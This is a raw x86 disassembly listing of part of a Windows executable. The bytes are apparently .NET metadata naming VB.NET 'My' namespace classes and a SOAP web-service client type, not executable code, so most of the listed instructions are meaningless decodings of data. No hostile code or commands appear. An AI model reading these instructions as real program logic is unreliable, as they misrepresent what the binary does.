  40b0ee:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40b0f1:	0a 20                	or     (%eax),%ah
  40b0f3:	05 12 29 08 18       	add    $0x18082912,%eax
  40b0f8:	18 12                	sbb    %dl,(%edx)
  40b0fa:	4d                   	dec    %ebp
  40b0fb:	1c 05                	sbb    $0x5,%al
  40b0fd:	20 01                	and    %al,(%ecx)
  40b0ff:	18 12                	sbb    %dl,(%edx)
  40b101:	29 06                	sub    %eax,(%esi)
  40b103:	20 03                	and    %al,(%ebx)
  40b105:	18 08                	sbb    %cl,(%eax)
  40b107:	18 18                	sbb    %bl,(%eax)
  40b109:	02 06                	add    (%esi),%al
  40b10b:	09 03                	or     %eax,(%ebx)
  40b10d:	06                   	push   %es
  40b10e:	11 48 04             	adc    %ecx,0x4(%eax)
  40b111:	00 00                	add    %al,(%eax)
  40b113:	00 80 04 02 00 00    	add    %al,0x204(%eax)
  40b119:	00 04 01             	add    %al,(%ecx,%eax,1)
  40b11c:	00 00                	add    %al,(%eax)
  40b11e:	00 05 20 01 01 11    	add    %al,0x11010120
  40b124:	5d                   	pop    %ebp
  40b125:	08 01                	or     %al,(%ecx)
  40b127:	00 01                	add    %al,(%ecx)
  40b129:	00 00                	add    %al,(%eax)
  40b12b:	00 00                	add    %al,(%eax)
  40b12d:	00 05 20 02 01 0e    	add    %al,0xe010220
  40b133:	0e                   	push   %cs
  40b134:	18 01                	sbb    %al,(%ecx)
  40b136:	00 0a                	add    %cl,(%edx)
  40b138:	4d                   	dec    %ebp
  40b139:	79 54                	jns    0x40b18f
  40b13b:	65 6d                	gs insl (%dx),%es:(%edi)
  40b13d:	70 6c                	jo     0x40b1ab
  40b13f:	61                   	popa
  40b140:	74 65                	je     0x40b1a7
  40b142:	08 31                	or     %dh,(%ecx)
  40b144:	34 2e                	xor    $0x2e,%al
  40b146:	30 2e                	xor    %ch,(%esi)
  40b148:	30 2e                	xor    %ch,(%esi)
  40b14a:	30 00                	xor    %al,(%eax)
  40b14c:	00 06                	add    %al,(%esi)
  40b14e:	15 12 18 01 12       	adc    $0x12011812,%eax
  40b153:	0c 06                	or     $0x6,%al
  40b155:	15 12 18 01 12       	adc    $0x12011812,%eax
  40b15a:	08 06                	or     %al,(%esi)
  40b15c:	15 12 18 01 12       	adc    $0x12011812,%eax
  40b161:	11 06                	adc    %eax,(%esi)
  40b163:	15 12 18 01 12       	adc    $0x12011812,%eax
  40b168:	14 04                	adc    $0x4,%al
  40b16a:	07                   	pop    %es
  40b16b:	01 12                	add    %edx,(%edx)
  40b16d:	0c 04                	or     $0x4,%al
  40b16f:	07                   	pop    %es
  40b170:	01 12                	add    %edx,(%edx)
  40b172:	08 04 07             	or     %al,(%edi,%eax,1)
  40b175:	01 12                	add    %edx,(%edx)
  40b177:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40b17a:	01 12                	add    %edx,(%edx)
  40b17c:	14 04                	adc    $0x4,%al
  40b17e:	20 01                	and    %al,(%ecx)
  40b180:	01 0e                	add    %ecx,(%esi)
  40b182:	0c 01                	or     $0x1,%al
  40b184:	00 07                	add    %al,(%edi)
  40b186:	4d                   	dec    %ebp
  40b187:	79 2e                	jns    0x40b1b7
  40b189:	55                   	push   %ebp
  40b18a:	73 65                	jae    0x40b1f1
  40b18c:	72 00                	jb     0x40b18e
  40b18e:	00 13                	add    %dl,(%ebx)
  40b190:	01 00                	add    %eax,(%eax)
  40b192:	0e                   	push   %cs
  40b193:	4d                   	dec    %ebp
  40b194:	79 2e                	jns    0x40b1c4
  40b196:	57                   	push   %edi
  40b197:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40b19b:	72 76                	jb     0x40b213
  40b19d:	69 63 65 73 00 00 10 	imul   $0x10000073,0x65(%ebx),%esp
  40b1a4:	01 00                	add    %eax,(%eax)
  40b1a6:	0b 4d 79             	or     0x79(%ebp),%ecx
  40b1a9:	2e 43                	cs inc %ebx
  40b1ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1ac:	6d                   	insl   (%dx),%es:(%edi)
  40b1ad:	70 75                	jo     0x40b224
  40b1af:	74 65                	je     0x40b216
  40b1b1:	72 00                	jb     0x40b1b3
  40b1b3:	00 13                	add    %dl,(%ebx)
  40b1b5:	01 00                	add    %eax,(%eax)
  40b1b7:	0e                   	push   %cs
  40b1b8:	4d                   	dec    %ebp
  40b1b9:	79 2e                	jns    0x40b1e9
  40b1bb:	41                   	inc    %ecx
  40b1bc:	70 70                	jo     0x40b22e
  40b1be:	6c                   	insb   (%dx),%es:(%edi)
  40b1bf:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40b1c6:	00 00                	add    %al,(%eax)
  40b1c8:	04 00                	add    $0x0,%al
  40b1ca:	01 1c 1c             	add    %ebx,(%esp,%ebx,1)
  40b1cd:	03 07                	add    (%edi),%eax
  40b1cf:	01 02                	add    %eax,(%edx)
  40b1d1:	03 07                	add    (%edi),%eax
  40b1d3:	01 08                	add    %ecx,(%eax)
  40b1d5:	06                   	push   %es
  40b1d6:	00 01                	add    %al,(%ecx)
  40b1d8:	12 15 11 79 04 07    	adc    0x7047911,%dl
  40b1de:	01 12                	add    %edx,(%edx)
  40b1e0:	15 03 07 01 0e       	adc    $0xe010703,%eax
  40b1e5:	05 10 01 00 1e       	add    $0x1e000110,%eax
  40b1ea:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40b1ed:	01 1e                	add    %ebx,(%esi)
  40b1ef:	00 04 07             	add    %al,(%edi,%eax,1)
  40b1f2:	01 1e                	add    %ebx,(%esi)
  40b1f4:	00 07                	add    %al,(%edi)
  40b1f6:	20 04 01             	and    %al,(%ecx,%eax,1)
  40b1f9:	0e                   	push   %cs
  40b1fa:	0e                   	push   %cs
  40b1fb:	0e                   	push   %cs
  40b1fc:	0e                   	push   %cs
  40b1fd:	61                   	popa
  40b1fe:	01 00                	add    %eax,(%eax)
  40b200:	34 53                	xor    $0x53,%al
  40b202:	79 73                	jns    0x40b277
  40b204:	74 65                	je     0x40b26b
  40b206:	6d                   	insl   (%dx),%es:(%edi)
  40b207:	2e 57                	cs push %edi
  40b209:	65 62 2e             	bound  %ebp,%gs:(%esi)
  40b20c:	53                   	push   %ebx
  40b20d:	65 72 76             	gs jb  0x40b286
  40b210:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  40b217:	6f                   	outsl  %ds:(%esi),(%dx)
  40b218:	74 6f                	je     0x40b289
  40b21a:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40b21d:	73 2e                	jae    0x40b24d
  40b21f:	53                   	push   %ebx
  40b220:	6f                   	outsl  %ds:(%esi),(%dx)
  40b221:	61                   	popa
  40b222:	70 48                	jo     0x40b26c
  40b224:	74 74                	je     0x40b29a
  40b226:	70 43                	jo     0x40b26b
  40b228:	6c                   	insb   (%dx),%es:(%edi)
  40b229:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  40b230:	74 6f                	je     0x40b2a1
  40b232:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40b235:	12 43 72             	adc    0x72(%ebx),%al
  40b238:	65 61                	gs popa
  40b23a:	74 65                	je     0x40b2a1
  40b23c:	5f                   	pop    %edi
  40b23d:	5f                   	pop    %edi
  40b23e:	49                   	dec    %ecx
  40b23f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b240:	73 74                	jae    0x40b2b6
  40b242:	61                   	popa
  40b243:	6e                   	outsb  %ds:(%esi),(%dx)
  40b244:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40b247:	5f                   	pop    %edi
  40b248:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  40b24c:	70 6f                	jo     0x40b2bd
  40b24e:	73 65                	jae    0x40b2b5
  40b250:	5f                   	pop    %edi
  40b251:	5f                   	pop    %edi
  40b252:	49                   	dec    %ecx
  40b253:	6e                   	outsb  %ds:(%esi),(%dx)
  40b254:	73 74                	jae    0x40b2ca
  40b256:	61                   	popa
  40b257:	6e                   	outsb  %ds:(%esi),(%dx)
  40b258:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40b25b:	5f                   	pop    %edi
  40b25c:	00 00                	add    %al,(%eax)
  40b25e:	00 06                	add    %al,(%esi)
  40b260:	15 12 18 01 13       	adc    $0x13011812,%eax
  40b265:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40b268:	01 13                	add    %edx,(%ebx)
  40b26a:	00 04 07             	add    %al,(%edi,%eax,1)
  40b26d:	01 13                	add    %edx,(%ebx)
  40b26f:	00 04 20             	add    %al,(%eax,%eiz,1)
  40b272:	01 01                	add    %eax,(%ecx)
  40b274:	02 05 01 00 00 00    	add    0x1,%al
  40b27a:	00 04 00             	add    %al,(%eax,%eax,1)
  40b27d:	01 08                	add    %ecx,(%eax)
  40b27f:	0e                   	push   %cs
  40b280:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40b285:	0e                   	push   %cs
  40b286:	07                   	pop    %es
  40b287:	20 02                	and    %al,(%edx)
  40b289:	12 29                	adc    (%ecx),%ch
  40b28b:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40b28e:	05 20 01 01 12       	add    $0x12010120,%eax
  40b293:	29 31                	sub    %esi,(%ecx)
  40b295:	01 00                	add    %eax,(%eax)
  40b297:	12 3c 67             	adc    (%edi,%eiz,2),%bh
  40b29a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b29c:	65 72 61             	gs jb  0x40b300
  40b29f:	74 65                	je     0x40b306
  40b2a1:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40b2a5:	74 68                	je     0x40b30f
  40b2a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2a8:	64 3e 01 00          	fs add %eax,%ds:(%eax)
  40b2ac:	54                   	push   %esp
  40b2ad:	0e                   	push   %cs
  40b2ae:	04 54                	add    $0x54,%al
  40b2b0:	79 70                	jns    0x40b322
  40b2b2:	65 12 3c 67          	adc    %gs:(%edi,%eiz,2),%bh
  40b2b6:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b2b8:	65 72 61             	gs jb  0x40b31c
  40b2bb:	74 65                	je     0x40b322
  40b2bd:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40b2c1:	74 68                	je     0x40b32b
  40b2c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2c4:	64 3e 04 00          	fs ds add $0x0,%al
  40b2c8:	01 01                	add    %eax,(%ecx)
  40b2ca:	08 04 00             	or     %al,(%eax,%eax,1)
  40b2cd:	01 0e                	add    %ecx,(%esi)
  40b2cf:	1c 06                	sbb    $0x6,%al
  40b2d1:	00 01                	add    %al,(%ecx)
  40b2d3:	01 12                	add    %edx,(%edx)
  40b2d5:	80 a5 06 00 03 0e 0e 	andb   $0xe,0xe030006(%ebp)
  40b2dc:	0e                   	push   %cs
  40b2dd:	0e                   	push   %cs
  40b2de:	05 20 00 12 80       	add    $0x80120020,%eax
  40b2e3:	bd 06 00 01 12       	mov    $0x12010006,%ebp
  40b2e8:	80 bd 0e 06 20 01 01 	cmpb   $0x1,0x120060e(%ebp)
  40b2ef:	11 80 c9 05 00 01    	adc    %eax,0x10005c9(%eax)
  40b2f5:	0e                   	push   %cs
  40b2f6:	1d 0e 08 00 01       	sbb    $0x100080e,%eax
  40b2fb:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  40b301:	05 20 00 12 80       	add    $0x80120020,%eax
  40b306:	d5 05                	aad    $0x5
  40b308:	20 00                	and    %al,(%eax)
  40b30a:	12 80 d9 07 20 02    	adc    0x22007d9(%eax),%al
  40b310:	12 80 d9 0e 02 05    	adc    0x5020ed9(%eax),%al
  40b316:	20 02                	and    %al,(%edx)
  40b318:	01 0e                	add    %ecx,(%esi)
  40b31a:	1c 06                	sbb    $0x6,%al
  40b31c:	00 01                	add    %al,(%ecx)
  40b31e:	0e                   	push   %cs
  40b31f:	11 80 dd 07 00 04    	adc    %eax,0x40007dd(%eax)
  40b325:	0e                   	push   %cs
  40b326:	0e                   	push   %cs
  40b327:	0e                   	push   %cs
  40b328:	0e                   	push   %cs
  40b329:	0e                   	push   %cs
  40b32a:	05 00 02 1c 0e       	add    $0xe1c0200,%eax
  40b32f:	0e                   	push   %cs
  40b330:	10 00                	adc    %al,(%eax)
  40b332:	07                   	pop    %es
  40b333:	1c 1c                	sbb    $0x1c,%al
  40b335:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40b33b:	0e                   	push   %cs
  40b33c:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40b341:	06                   	push   %es
  40b342:	00 02                	add    %al,(%edx)
  40b344:	1c 1c                	sbb    $0x1c,%al
  40b346:	12 15 10 00 08 01    	adc    0x1080010,%dl
  40b34c:	1c 12                	sbb    $0x12,%al
  40b34e:	15 0e 1d 1c 1d       	adc    $0x1d1c1d0e,%eax
  40b353:	0e                   	push   %cs
  40b354:	1d 12 15 02 02       	sbb    $0x2021512,%eax
  40b359:	11 00                	adc    %eax,(%eax)
  40b35b:	08 1c 1c             	or     %bl,(%esp,%ebx,1)
  40b35e:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40b364:	0e                   	push   %cs
  40b365:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40b36a:	02 07                	add    (%edi),%al
  40b36c:	20 02                	and    %al,(%edx)
  40b36e:	01 0e                	add    %ecx,(%esi)
  40b370:	11 80 e9 06 20 01    	adc    %eax,0x12006e9(%eax)
  40b376:	01 12                	add    %edx,(%edx)
  40b378:	80 ed 2f             	sub    $0x2f,%ch
  40b37b:	07                   	pop    %es
  40b37c:	14 0e                	adc    $0xe,%al
  40b37e:	12 2d 12 2d 12 80    	adc    0x80122d12,%ch
  40b384:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b385:	12 80 a5 1c 12 80    	adc    -0x7fede35b(%eax),%al
  40b38b:	a9 12 80 a5 12       	test   $0x12a58012,%eax
  40b390:	80 ad 12 80 b1 12 80 	subb   $0x80,0x12b18012(%ebp)
  40b397:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b398:	12 80 a5 0e 12 80    	adc    -0x7fedf15b(%eax),%al
  40b39e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b39f:	1d 0e 1d 1c 1d       	sbb    $0x1d1c1d0e,%eax
  40b3a4:	1c 1d                	sbb    $0x1d,%al
  40b3a6:	02 1c 1d 1c 05 00 00 	add    0x51c(,%ebx,1),%bl
  40b3ad:	12 80 ad 05 20 00    	adc    0x2005ad(%eax),%al
  40b3b3:	12 80 f1 0a 07 03    	adc    0x3070af1(%eax),%al
  40b3b9:	12 80 b1 12 80 a5    	adc    -0x5a7fed4f(%eax),%al
  40b3bf:	1d 0e 04 20 01       	sbb    $0x120040e,%eax
  40b3c4:	0e                   	push   %cs
  40b3c5:	0e                   	push   %cs
  40b3c6:	04 20                	add    $0x20,%al
  40b3c8:	01 02                	add    %eax,(%edx)
  40b3ca:	0e                   	push   %cs
  40b3cb:	04 07                	add    $0x7,%al
  40b3cd:	02 02                	add    (%edx),%al
  40b3cf:	0e                   	push   %cs
  40b3d0:	05 20 00 12 80       	add    $0x80120020,%eax
  40b3d5:	fd                   	std
  40b3d6:	03 20                	add    (%eax),%esp
  40b3d8:	00 1c 08             	add    %bl,(%eax,%ecx,1)
  40b3db:	00 03                	add    %al,(%ebx)
  40b3dd:	1c 1c                	sbb    $0x1c,%al
  40b3df:	1d 1c 1d 0e 06       	sbb    $0x60e1d1c,%eax
  40b3e4:	00 03                	add    %al,(%ebx)
  40b3e6:	08 0e                	or     %cl,(%esi)
  40b3e8:	0e                   	push   %cs
  40b3e9:	02 03                	add    (%ebx),%al
  40b3eb:	20 00                	and    %al,(%eax)
  40b3ed:	02 0e                	add    (%esi),%cl
  40b3ef:	07                   	pop    %es
  40b3f0:	08 02                	or     %al,(%edx)
  40b3f2:	1c 1c                	sbb    $0x1c,%al
  40b3f4:	1c 0e                	sbb    $0xe,%al
  40b3f6:	12 80 fd 1d 1c 1d    	adc    0x1d1c1dfd(%eax),%al
  40b3fc:	1c 03                	sbb    $0x3,%al
  40b3fe:	20 00                	and    %al,(%eax)
  40b400:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40b403:	02 02                	add    (%edx),%al
  40b405:	02 04 07             	add    (%edi,%eax,1),%al
  40b408:	02 02                	add    (%edx),%al
  40b40a:	18 05 20 02 08 08    	sbb    %al,0x8080220
  40b410:	08 06                	or     %al,(%esi)
  40b412:	20 01                	and    %al,(%ecx)
  40b414:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40b419:	20 01                	and    %al,(%ecx)
  40b41b:	08 08                	or     %cl,(%eax)
  40b41d:	07                   	pop    %es
  40b41e:	00 01                	add    %al,(%ecx)
  40b420:	1d 12 81 21 0e       	sbb    $0xe218112,%eax
  40b425:	16                   	push   %ss
  40b426:	07                   	pop    %es
  40b427:	08 0e                	or     %cl,(%esi)
  40b429:	1d 12 81 21 12       	sbb    $0x12218112,%eax
  40b42e:	81 21 12 80 a5 1d    	andl   $0x1da58012,(%ecx)
  40b434:	03 1d 03 08 1d 12    	add    0x121d0803,%ebx
  40b43a:	81 21 0c 20 03 01    	andl   $0x103200c,(%ecx)
  40b440:	11 81 31 11 81 35    	adc    %eax,0x35811131(%ecx)
  40b446:	11 81 39 04 20 01    	adc    %eax,0x1200439(%ecx)
  40b44c:	01 08                	add    %ecx,(%eax)
  40b44e:	05 20 02 01 0e       	add    $0xe010220,%eax
  40b453:	08 0e                	or     %cl,(%esi)
  40b455:	20 06                	and    %al,(%esi)
  40b457:	12 29                	adc    (%ecx),%ch
  40b459:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40b45e:	81 41 12 4d 1c 09 20 	addl   $0x20091c4d,0x12(%ecx)
  40b465:	04 01                	add    $0x1,%al
  40b467:	12 81 2d 1c 08 08    	adc    0x8081c2d(%ecx),%al
  40b46d:	09 07                	or     %eax,(%edi)
  40b46f:	03 1c 12             	add    (%edx,%edx,1),%ebx
  40b472:	81 2d 12 80 a5 05 20 	subl   $0xe0e0220,0x5a58012
  40b479:	02 0e 0e 
  40b47c:	0e                   	push   %cs
  40b47d:	05 00 00 12 81       	add    $0x81120000,%eax
  40b482:	49                   	dec    %ecx
  40b483:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b488:	1c 09                	sbb    $0x9,%al
  40b48a:	07                   	pop    %es
  40b48b:	04 1c                	add    $0x1c,%al
  40b48d:	12 80 f9 02 1d 1c    	adc    0x1c1d02f9(%eax),%al
  40b493:	05 20 00 11 81       	add    $0x81110020,%eax
  40b498:	4d                   	dec    %ebp
  40b499:	0c 07                	or     $0x7,%al
  40b49b:	04 0e                	add    $0xe,%al
  40b49d:	12 80 a9 12 80 a5    	adc    -0x5a7fed57(%eax),%al
  40b4a3:	11 81 4d 06 07 02    	adc    %eax,0x207064d(%ecx)
  40b4a9:	0e                   	push   %cs
  40b4aa:	12 80 a5 05 00 00    	adc    0x5a5(%eax),%al
  40b4b0:	12 81 55 06 20 01    	adc    0x1200655(%ecx),%al
  40b4b6:	01 12                	add    %edx,(%edx)
  40b4b8:	81 55 06 20 01 02 11 	adcl   $0x11020120,0x6(%ebp)
  40b4bf:	81 5d 07 07 03 0e 12 	sbbl   $0x120e0307,0x7(%ebp)
  40b4c6:	80 a5 02 05 20 00 12 	andb   $0x12,0x200502(%ebp)
  40b4cd:	81 65 05 20 00 12 81 	andl   $0x81120020,0x5(%ebp)
  40b4d4:	69 05 20 00 12 81 61 	imul   $0x1200461,0x81120020,%eax
  40b4db:	04 20 01 
  40b4de:	1c 0e                	sbb    $0xe,%al
  40b4e0:	05 20 01 12 31       	add    $0x31120120,%eax
  40b4e5:	0e                   	push   %cs
  40b4e6:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40b4eb:	08 11                	or     %dl,(%ecx)
  40b4ed:	07                   	pop    %es
  40b4ee:	06                   	push   %es
  40b4ef:	0e                   	push   %cs
  40b4f0:	12 81 01 12 31 12    	adc    0x12311201(%ecx),%al
  40b4f6:	81 61 12 80 a5 12 81 	andl   $0x8112a580,0x12(%ecx)
  40b4fd:	69 06 20 01 01 12    	imul   $0x12010120,(%esi),%eax
  40b503:	81 6d 05 00 02 1c 1c 	subl   $0x1c1c0200,0x5(%ebp)
  40b50a:	1c 10                	sbb    $0x10,%al
  40b50c:	07                   	pop    %es
  40b50d:	06                   	push   %es
  40b50e:	0e                   	push   %cs
  40b50f:	12 81 6d 12 81 01    	adc    0x181126d(%ecx),%al
  40b515:	0e                   	push   %cs
  40b516:	12 81 71 12 81 69    	adc    0x69811271(%ecx),%al
  40b51c:	09 07                	or     %eax,(%edi)
  40b51e:	03 0e                	add    (%esi),%ecx
  40b520:	12 81 71 12 80 a5    	adc    -0x5a7fed8f(%ecx),%al
  40b526:	05 20 00 12 80       	add    $0x80120020,%eax
  40b52b:	f9                   	stc
  40b52c:	03 20                	add    (%eax),%esp
  40b52e:	00 0b                	add    %cl,(%ebx)
  40b530:	04 00                	add    $0x0,%al
  40b532:	01 0d 1c 04 00 01    	add    %ecx,0x100041c
  40b538:	0d 0d 09 07 05       	or     $0x507090d,%eax
  40b53d:	0e                   	push   %cs
  40b53e:	0a 0e                	or     (%esi),%cl
  40b540:	12 80 a5 0d 05 20    	adc    0x20050da5(%eax),%al
  40b546:	01 08                	add    %ecx,(%eax)
  40b548:	12 29                	adc    (%ecx),%ch
  40b54a:	04 20                	add    $0x20,%al
  40b54c:	00 1d 05 04 00 01    	add    %bl,0x1000405
  40b552:	0a 0e                	or     (%esi),%cl
  40b554:	04 20                	add    $0x20,%al
  40b556:	01 01                	add    %eax,(%ecx)
  40b558:	05 07 20 03 01       	add    $0x1032007,%eax
  40b55d:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  40b562:	20 00                	and    %al,(%eax)
  40b564:	0a 06                	or     (%esi),%al
  40b566:	20 01                	and    %al,(%ecx)
  40b568:	01 12                	add    %edx,(%edx)
  40b56a:	81 89 09 07 04 08 1c 	orl    $0xa580121c,0x8040709(%ecx)
  40b571:	12 80 a5 
  40b574:	1d 1c 05 07 01       	sbb    $0x107051c,%eax
  40b579:	12 80 a5 06 00 02    	adc    0x20006a5(%eax),%al
  40b57f:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40b582:	02 07                	add    (%edi),%al
  40b584:	20 02                	and    %al,(%edx)
  40b586:	02 08                	add    (%eax),%cl
  40b588:	11 81 95 0d 07 06    	adc    %eax,0x6070d95(%ecx)
  40b58e:	12 1d 1d 05 1d 05    	adc    0x51d051d,%bl
  40b594:	12 80 a5 1c 02 0e    	adc    0xe021ca5(%eax),%al
  40b59a:	07                   	pop    %es
  40b59b:	04 12                	add    $0x12,%al
  40b59d:	80 a5 12 80 a5 12 80 	andb   $0x80,0x12a58012(%ebp)
  40b5a4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b5a5:	12 80 a5 07 07 02    	adc    0x20707a5(%eax),%al
  40b5ab:	12 80 a5 1d 0e 02    	adc    0x20e1da5(%eax),%al
  40b5b1:	1d 05 0a 00 04       	sbb    $0x4000a05,%eax
  40b5b6:	1d 0e 0e 0e 08       	sbb    $0x80e0e0e,%eax
  40b5bb:	11 81 b1 06 20 01    	adc    %eax,0x12006b1(%ecx)
  40b5c1:	01 11                	add    %edx,(%ecx)
  40b5c3:	81 b9 04 00 01 01 02 	cmpl   $0x1000602,0x1010004(%ecx)
  40b5ca:	06 00 01 
  40b5cd:	01 11                	add    %edx,(%ecx)
  40b5cf:	81 c5 06 00 01 12    	add    $0x12010006,%ebp
  40b5d5:	80 ad 0e 09 00 04 08 	subb   $0x8,0x400090e(%ebp)
  40b5dc:	0e                   	push   %cs
  40b5dd:	11 81 c9 02 08 04    	adc    %eax,0x40802c9(%ecx)
  40b5e3:	20 01                	and    %al,(%ecx)
  40b5e5:	01 1c 05 00 02 01 0e 	add    %ebx,0xe010200(,%eax,1)
  40b5ec:	0e                   	push   %cs
  40b5ed:	05 00 00 12 81       	add    $0x81120000,%eax
  40b5f2:	cd 05                	int    $0x5
  40b5f4:	20 00                	and    %al,(%eax)
  40b5f6:	11 81 a5 08 20 03    	adc    %eax,0x32008a5(%ecx)
  40b5fc:	01 08                	add    %ecx,(%eax)
  40b5fe:	08 11                	or     %dl,(%ecx)
  40b600:	81 d1 08 00 01 12    	adc    $0x12010008,%ecx
  40b606:	81 9d 12 81 d5 05 20 	sbbl   $0x8010220,0x5d58112(%ebp)
  40b60d:	02 01 08 
  40b610:	08 0d 20 06 01 08    	or     %cl,0x8010620
  40b616:	08 08                	or     %cl,(%eax)
  40b618:	08 11                	or     %dl,(%ecx)
  40b61a:	81 a1 11 81 d9 07 20 	andl   $0x8010420,0x7d98111(%ecx)
  40b621:	04 01 08 
  40b624:	08 08                	or     %cl,(%eax)
  40b626:	08 0f                	or     %cl,(%edi)
  40b628:	20 04 01             	and    %al,(%ecx,%eax,1)
  40b62b:	12 81 d5 11 81 a5    	adc    -0x5a7eee2b(%ecx),%al
  40b631:	11 81 a5 11 81 dd    	adc    %eax,-0x227eee5b(%ecx)
  40b637:	05 00 00 12 81       	add    $0x81120000,%eax
  40b63c:	e1 09                	loope  0x40b647
  40b63e:	20 02                	and    %al,(%edx)
  40b640:	01 12                	add    %edx,(%edx)
  40b642:	81 85 12 81 e1 43 07 	addl   $0xe1d1907,0x43e18112(%ebp)
  40b649:	19 1d 0e 
  40b64c:	0e                   	push   %cs
  40b64d:	12 80 f5 12 80 a5    	adc    -0x5a7fed0b(%eax),%al
  40b653:	12 80 a5 12 80 a5    	adc    -0x5a7fed5b(%eax),%al
  40b659:	12 80 a5 0e 12 80    	adc    -0x7fedf15b(%eax),%al
  40b65f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b660:	1d 05 12 81 9d       	sbb    $0x9d811205,%eax
  40b665:	11 81 a1 11 81 a5    	adc    %eax,-0x5a7eee5f(%ecx)
  40b66b:	12 81 9d 12 81 a9    	adc    -0x567eed63(%ecx),%al
  40b671:	12 1d 12 81 a9 12    	adc    0x12a98112,%bl
  40b677:	80 a5 12 80 a5 0e 1d 	andb   $0x1d,0xea58012(%ebp)
  40b67e:	0e                   	push   %cs
  40b67f:	11 81 a5 11 81 a5    	adc    %eax,-0x5a7eee5b(%ecx)
  40b685:	11 81 a5 11 81 a5    	adc    %eax,-0x5a7eee5b(%ecx)
  40b68b:	05 00 00 12 81       	add    $0x81120000,%eax
  40b690:	e9 07 20 01 12       	jmp    0x1241d69c
  40b695:	81 ed 1d 05 05 20    	sub    $0x2005051d,%ebp
  40b69b:	00 1d 12 15 06 20    	add    %bl,0x20061512
  40b6a1:	00 1d 12 81 e5 06    	add    %bl,0x6e58112
  40b6a7:	00 03                	add    %al,(%ebx)
  40b6a9:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  40b6ac:	02 16                	add    (%esi),%dl
  40b6ae:	07                   	pop    %es
  40b6af:	0a 12                	or     (%edx),%dl
  40b6b1:	15 1c 0e 12 80       	adc    $0x80120e1c,%eax
  40b6b6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b6b7:	08 1d 12 15 08 1d    	or     %bl,0x1d081512
  40b6bd:	12 81 e5 1d 1c 1d    	adc    0x1d1c1de5(%ecx),%al
  40b6c3:	1c 05                	sbb    $0x5,%al
  40b6c5:	00 01                	add    %al,(%ecx)
  40b6c7:	11 41 0d             	adc    %eax,0xd(%ecx)
  40b6ca:	04 20                	add    $0x20,%al
  40b6cc:	00 11                	add    %dl,(%ecx)
  40b6ce:	41                   	inc    %ecx
  40b6cf:	07                   	pop    %es
  40b6d0:	00 02                	add    %al,(%edx)
  40b6d2:	02 11                	add    (%ecx),%dl
  40b6d4:	41                   	inc    %ecx
  40b6d5:	11 41 14             	adc    %eax,0x14(%ecx)
  40b6d8:	07                   	pop    %es
  40b6d9:	09 12                	or     %edx,(%edx)
  40b6db:	50                   	push   %eax
  40b6dc:	12 81 f9 08 11 41    	adc    0x411108f9(%ecx),%al
  40b6e2:	12 2d 08 12 80 a5    	adc    0xa5801208,%ch
  40b6e8:	1d 03 1d 0e 06       	sbb    $0x60e1d03,%eax
  40b6ed:	15 12 81 fd 01       	adc    $0x1fd8112,%eax
  40b6f2:	0e                   	push   %cs
  40b6f3:	05 20 01 01 13       	add    $0x13010120,%eax
  40b6f8:	00 06                	add    %al,(%esi)
  40b6fa:	00 00                	add    %al,(%eax)
  40b6fc:	1d 12 80 ad 07       	sbb    $0x7ad8012,%eax
  40b701:	15 12 82 01 02       	adc    $0x2018212,%eax
  40b706:	0e                   	push   %cs
  40b707:	02 13                	add    (%ebx),%dl
  40b709:	10 01                	adc    %al,(%ecx)
  40b70b:	02 02                	add    (%edx),%al
  40b70d:	15 12 82 09 01       	adc    $0x1098212,%eax
  40b712:	1e                   	push   %ds
  40b713:	00 15 12 82 01 02    	add    %dl,0x2018212
  40b719:	1e                   	push   %ds
  40b71a:	00 02                	add    %al,(%edx)
  40b71c:	03 0a                	add    (%edx),%ecx
  40b71e:	01 0e                	add    %ecx,(%esi)
  40b720:	15 07 08 08 1c       	adc    $0x1c080807,%eax
  40b725:	15 12 81 fd 01       	adc    $0x1fd8112,%eax
  40b72a:	0e                   	push   %cs
  40b72b:	12 80 ad 08 1d 0e    	adc    0xe1d08ad(%eax),%al
  40b731:	08 1d 12 80 ad 06    	or     %bl,0x6ad8012
  40b737:	00 01                	add    %al,(%ecx)
  40b739:	12 82 15 0e 05 20    	adc    0x20050e15(%edx),%al
